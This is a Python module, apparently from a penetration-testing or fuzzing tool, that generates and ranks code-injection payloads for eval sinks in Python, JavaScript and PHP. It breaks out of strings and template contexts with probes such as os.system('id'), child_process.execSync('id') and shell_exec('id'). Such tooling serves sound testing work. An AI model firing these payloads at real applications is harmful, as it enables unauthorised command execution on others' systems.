"""Code (eval sink) injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import CodeLang, Context, Risk
from .context import analyze_code_context

# Statement bodies per language, injected after closing a string.
_BODIES = {
    CodeLang.PYTHON: [
        ("__import__('os').system('id')", "os-system"),
        ("eval('1')", "eval"),
    ],
    CodeLang.JAVASCRIPT: [
        ("require('child_process').execSync('id')", "child-process"),
        ("global.process.mainModule.require('os')", "process"),
    ],
    CodeLang.PHP: [
        ("system('id')", "system"),
        ("shell_exec('id')", "shell-exec"),
    ],
}

_STRING_QUOTES = {
    CodeLang.PYTHON: ["'", '"'],
    CodeLang.JAVASCRIPT: ["'", '"', "`"],
    CodeLang.PHP: ["'", '"'],
}

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class CodeCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class CodeMutationResult:
    template: str
    lang: CodeLang
    context: Context
    generated: int
    valid: int
    candidates: list[CodeCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "lang": self.lang.value,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _generate(context: Context, lang: CodeLang) -> list[tuple[str, str]]:
    bodies = _BODIES[lang]
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    if context == Context.CODE_STRING:
        for quote in _STRING_QUOTES[lang]:
            for body, strategy in bodies:
                add(f"{quote}; {body} #", strategy)
                add(f"{quote} + {body} + {quote}", f"{strategy}-concat")
    elif context == Context.CODE_TEMPLATE:
        for body, strategy in bodies:
            add(f"${{{body}}}", f"{strategy}-template")
    else:  # expression
        for body, strategy in bodies:
            add(body, strategy)

    return out


def mutate_code(template: str, lang: CodeLang = CodeLang.PYTHON) -> CodeMutationResult:
    """Generate and rank code injection payloads for ``template``."""
    from .analyzer import analyze_code

    context = analyze_code_context(template, lang)
    generated = _generate(context, lang)

    candidates: list[CodeCandidate] = []
    for payload, strategy in generated:
        result = analyze_code(template, payload, lang)
        b = result.breakout
        if b.command_injected or b.substitution_injected:
            candidates.append(
                CodeCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return CodeMutationResult(
        template=template,
        lang=lang,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
